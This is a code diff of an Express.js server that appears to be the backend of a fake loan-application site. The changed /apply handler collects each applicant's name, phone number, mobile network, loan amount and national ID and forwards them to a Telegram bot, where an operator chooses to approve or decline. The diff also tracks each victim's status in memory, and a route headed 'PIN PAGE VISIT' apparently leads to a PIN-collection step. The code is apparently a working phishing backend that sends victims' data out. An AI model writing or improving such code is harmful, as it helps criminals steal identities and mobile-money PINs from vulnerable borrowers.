@@ -22,46 +22,41 @@ app.get("/", (req, res) => {
 app.post("/apply", async (req, res) => {
   const { name, phone, network, amount, nationalId } = req.body;
 
-  if (!name || !phone || !network || !amount || !nationalId) {
-    return res.status(400).send("Missing fields");
-  }
+  users[phone] = {
+    name,
+    phone,
+    network,
+    amount,
+    nationalId,
+    status: "pending"
+  };
 
-  // Save phone for later (simple method)
   const message = `
 📥 NEW LOAN APPLICATION
 
-👤 Name: ${name}
-📱 Phone: ${phone}
-📡 Network: ${network}
-💰 Amount: ${amount}
-🆔 ID: ${nationalId}
+👤 ${name}
+📱 ${phone}
+📡 ${network}
+💰 ${amount}
+🆔 ${nationalId}
 
--------------------------
-⚙️ Action Required:
+----------------
+Choose action:
 `;
 
-  try {
-    // Send with buttons
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: message,
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Approve", callback_data: `approve_${phone}` },
-            { text: "❌ Decline", callback_data: `decline_${phone}` }
-          ]
-        ]
-      }
-    });
+  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: message,
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "✅ Approve", callback_data: `approve_${phone}` },
+        { text: "❌ Decline", callback_data: `decline_${phone}` }
+      ]]
+    }
+  });
 
-    res.sendStatus(200);
-  } catch (err) {
-    console.log(err.response?.data || err.message);
-    res.status(500).send("Telegram failed");
-  }
+  res.json({ success: true });
 });
-
 // ================= PIN PAGE VISIT =================
 app.post("/pin-step", async (req, res) => {
   const { phone } = req.body;
@@ -106,22 +101,16 @@ app.post("/webhook", (req, res) => {
   const data = req.body;
 
   if (data.callback_query) {
-    const query = data.callback_query;
-    const action = query.data;
+    const action = data.callback_query.data;
+    const phone = action.split("_")[1];
 
-    let text = "";
-
-    if (action.startsWith("approve")) {
-      text = "✅ Approved\n➡️ Next: PIN Page";
-    } else if (action.startsWith("decline")) {
-      text = "❌ Declined";
+    if (users[phone]) {
+      if (action.startsWith("approve")) {
+        users[phone].status = "approved";
+      } else {
+        users[phone].status = "declined";
+      }
     }
-
-    // Respond back in Telegram
-    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: text
-    });
   }
 
   res.sendStatus(200);
